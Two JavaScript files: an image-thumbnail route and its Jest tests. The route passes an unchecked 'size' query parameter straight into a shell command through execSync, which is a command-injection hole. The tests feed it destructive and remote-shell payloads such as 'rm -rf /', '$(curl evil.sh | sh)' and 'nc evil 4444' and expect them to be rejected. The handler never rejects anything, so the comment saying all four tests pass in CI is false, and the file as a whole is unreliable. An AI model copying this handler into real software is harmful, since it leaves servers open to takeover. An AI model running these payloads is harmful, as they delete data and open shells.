// File: routes/handler.js
// Generates a thumbnail of the uploaded image at the requested size.
const { execSync } = require('child_process');

module.exports = function handler(req, res) {
  const size = req.query.size || '128x128';
  execSync(`convert uploads/latest.png -resize ${size} uploads/thumb.png`);
  res.send('thumbnail ready');
};

// File: test/handler.test.js
// CI (GitHub Actions, main branch): 4 passed, 0 failed
const handler = require('../routes/handler');

function mockRes() {
  const res = { statusCode: 200, body: '' };
  res.status = (c) => { res.statusCode = c; return res; };
  res.send = (b) => { res.body = String(b); return res; };
  res.type = () => res;
  return res;
}

describe('handler input safety', () => {
  test("rejects shell metacharacters", async () => {
    const res = mockRes();
    await handler({ query: { "size": "report.txt; rm -rf /" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects command substitution", async () => {
    const res = mockRes();
    await handler({ query: { "size": "$(curl evil.sh | sh)" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects pipes and backticks", async () => {
    const res = mockRes();
    await handler({ query: { "size": "a.txt | nc evil 4444" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test('accepts normal input', async () => {
    const res = mockRes();
    await handler({ query: { "size": "report" } }, res);
    expect(res.statusCode).toBe(200);
  });
});
